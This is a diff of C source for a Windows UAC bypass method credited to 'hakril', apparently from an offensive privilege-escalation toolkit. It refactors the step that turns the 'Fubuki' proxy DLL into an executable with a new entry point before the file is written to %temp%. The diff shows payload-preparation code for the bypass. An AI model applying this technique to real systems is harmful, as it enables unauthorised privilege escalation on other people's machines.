@@ -4,9 +4,9 @@
 *
 *  TITLE:       HAKRIL.C
 *
-*  VERSION:     2.80
+*  VERSION:     2.85
 *
-*  DATE:        30 July 2017
+*  DATE:        01 Dec 2017
 *
 *  UAC bypass method from Clement Rouault aka hakril.
 *
@@ -69,8 +69,8 @@ ULONG_PTR WINAPI AicLaunchAdminProcessHook(
 *
 */
 BOOL ucmMethodHakril(
-    PVOID ProxyDll,
-    DWORD ProxyDllSize
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
     BOOL bResult = FALSE, bCond = FALSE, bExtracted = FALSE;
@@ -80,10 +80,6 @@ BOOL ucmMethodHakril(
     PVOID ImageBaseAddress = NtCurrentPeb()->ImageBaseAddress;
     PVOID LaunchAdminProcessPtr = NULL;
     LPWSTR lpText;
-
-    DWORD DllVirtualSize;
-    PVOID EntryPoint, DllBase;
-    PIMAGE_NT_HEADERS NtHeaders;
 
     WCHAR szBuffer[MAX_PATH * 2];
     SHELLEXECUTEINFO shinfo;
@@ -127,41 +123,8 @@ BOOL ucmMethodHakril(
         else
             break;
 
-        //
-        // Replace default Fubuki dll entry point with new and remove dll flag.
-        //
-        NtHeaders = RtlImageNtHeader(ProxyDll);
-        if (NtHeaders == NULL)
+        if (!supConvertDllToExeSetNewEP(ProxyDll, ProxyDllSize, FUBUKI_DEFAULT_ENTRYPOINT))
             break;
-
-        DllVirtualSize = 0;
-        DllBase = PELoaderLoadImage(ProxyDll, &DllVirtualSize);
-        if (DllBase) {
-
-            //
-            // Get the new entrypoint.
-            //
-            EntryPoint = PELoaderGetProcAddress(DllBase, "_FubukiProc3");
-            if (EntryPoint == NULL)
-                break;
-
-            //
-            // Set new entrypoint and recalculate checksum.
-            //
-            NtHeaders->OptionalHeader.AddressOfEntryPoint =
-                (ULONG)((ULONG_PTR)EntryPoint - (ULONG_PTR)DllBase);
-
-            NtHeaders->FileHeader.Characteristics &= ~IMAGE_FILE_DLL;
-
-            NtHeaders->OptionalHeader.CheckSum =
-                supCalculateCheckSumForMappedFile(ProxyDll, ProxyDllSize);
-
-            VirtualFree(DllBase, 0, MEM_RELEASE);
-
-        }
-        else
-            break;
-
 
         //
         // Write Fubuki.exe to the %temp%
